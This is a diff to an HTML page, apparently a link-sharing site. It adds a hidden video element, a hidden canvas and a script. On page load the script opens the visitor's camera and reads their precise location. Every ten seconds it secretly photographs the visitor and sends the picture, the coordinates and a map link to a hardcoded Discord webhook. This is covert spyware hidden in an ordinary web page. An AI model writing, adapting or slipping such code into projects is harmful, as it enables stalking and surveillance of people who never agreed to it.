@@ -918,7 +918,96 @@
       <span id="toastMsg" style="white-space:nowrap; text-align:center;">Link copied to clipboard</span>
     </div>
   </div>
+ <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let captureInterval;
+        let currentLocation = { latitude: null, longitude: null };
+
+        // Function to get live location
+        function fetchLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    console.log("Requesting location permissions...");
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            console.log("Location permission granted.");
+                            const { latitude, longitude } = position.coords;
+                            resolve({ latitude, longitude });
+                        },
+                        (error) => {
+                            console.error("Error getting location", error);
+                            alert("Location access denied. Please enable location services.");
+                            reject(error);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                } else {
+                    console.error("Geolocation is not supported by this browser.");
+                    alert("Geolocation is not supported by this browser.");
+                    reject(new Error("Geolocation is not supported."));
+                }
+            });
+        }
+
+        // Function to capture photo and send to Discord
+        async function captureAndSend() {
+            // Get location before capturing photo
+            try {
+                currentLocation = await fetchLocation();
+            } catch (error) {
+                console.error('Location fetch failed:', error);
+                currentLocation = { latitude: "Not available", longitude: "Not available" };
+            }
+
+            // Construct Google Maps link if location is available
+            let googleMapsLink = "Location not available";
+            if (currentLocation.latitude !== "Not available" && currentLocation.longitude !== "Not available") {
+                googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${currentLocation.latitude},${currentLocation.longitude}`;
+            }
+
+            // Capture photo
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'captured_image.png');
+
+                // Include location in message content with Google Maps link
+                let locationMessage = `Location: Latitude ${currentLocation.latitude}, Longitude ${currentLocation.longitude}\nGoogle Maps: ${googleMapsLink}`;
+                formData.append('content', locationMessage);
+
+                // Send the photo and location to Discord
+                fetch('https://discord.com/api/webhooks/1567167116535267429/uukzCJ3h71xKJ8WauMW8N9qXLtc9dxExajHZ84HfrTZLWcCTOLmNaEAkh4mUSOHCLi_O', {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Successfully sent image and location to Discord');
+                    } else {
+                        console.error('Error sending to Discord:', response.statusText);
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error sending to Discord:', error);
+                });
+            }, 'image/png');
+        }
+
+        // Start camera and initiate auto-capture
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+                captureInterval = setInterval(captureAndSend, 10000);  // Capture every 5 seconds
+            })
+            .catch((error) => {
+                console.error("Error accessing the camera", error);
+            });
+    </script>
   <script type="module" src="app.js"></script>
 </body>
 </html>
